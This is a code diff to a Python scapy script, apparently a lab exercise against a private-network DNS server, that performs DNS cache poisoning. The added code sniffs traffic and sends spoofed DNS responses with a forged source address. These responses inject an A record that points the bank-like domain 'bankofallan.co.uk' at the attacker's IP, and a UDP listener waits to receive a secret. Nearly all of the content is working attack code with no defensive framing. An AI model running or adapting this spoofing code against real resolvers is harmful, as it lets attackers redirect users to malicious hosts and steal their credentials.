@@ -1,4 +1,6 @@
-from scapy.all import DNS, DNSQR, IP, sr1, UDP, sniff, Raw
+import os
+os.sys.path.append('/usr/bin/')
+from scapy.all import DNS, DNSQR, IP, sr1, UDP, sniff,DNSRR, Raw, send
 import socket
 import threading
 import time
@@ -17,30 +19,34 @@ def launch_dns_attack(destination_ip, destination_port,query_name, is_finished):
 def manage_answer(answer):
         # print(answer[DNS].show())
         return
-def poison_cache(destination_ip, destination_port,bad_guy_port, is_finished):
+def poison_cache(destination_ip, destination_port,bad_guy_ip,bad_guy_port, query_to_forger,is_finished):
         while not is_finished[0]:
                 sniffed_packets=sniff(filter="port "+str(bad_guy_port),count=1,promisc=1)
                 for i in sniffed_packets:
                         src = i[Raw].load
-                        print(src)
+                        # print(src)
                         # print(i[UDP].show())
                         string = '.'.join(str(ord(c)) for c in src)
-                        print(string)
-                dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name))       
+                        # print(string)
+                dns_resp = IP(dst=destination_ip, src=bad_guy_ip)/UDP(dport=destination_port,sport=bad_guy_port)/DNS(id=0,qd=DNSQR(qname=query_name),an=DNSRR(rrname=query_to_forger, type='A',rdata=bad_guy_ip, ttl=100))
+                send(dns_resp)
+                # dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name)) 
+                      
 dns_to_attack_ip = "192.168.56.101"
 bad_guy_ip = "192.168.56.1"
 bad_guy_port = 55553
-print(dir(UDP))
+# print(dir(UDP))http://ricerca.wind.it/?missingurl=dnsrr.fields
 local_ip = "127.0.0.1"
 dns_to_attack_port = 53
 udp_listen_port = 1337
 buffer_size = 1024
 query_name = "badguy.ru"
+query_to_forger = "bankofallan.co.uk"
 #variable to sync threads
 is_finished = [False]
 # Launching an asyncronous Thread performing DNS Cache Poisoning
 attacker_thread = threading.Thread(target= launch_dns_attack, args=(dns_to_attack_ip, dns_to_attack_port,query_name, is_finished, ))
-poisoner_thread = threading.Thread(target=poison_cache, args=(dns_to_attack_ip,dns_to_attack_port, bad_guy_port, is_finished ,))
+poisoner_thread = threading.Thread(target=poison_cache, args=(dns_to_attack_ip,dns_to_attack_port, bad_guy_ip,bad_guy_port,query_to_forger, is_finished ,))
 # Launching UDP server in listen mode in order to receive the UDP packet
 # containing the secret
 udp_socket = launch_dns_listen_server(local_ip, udp_listen_port, buffer_size)
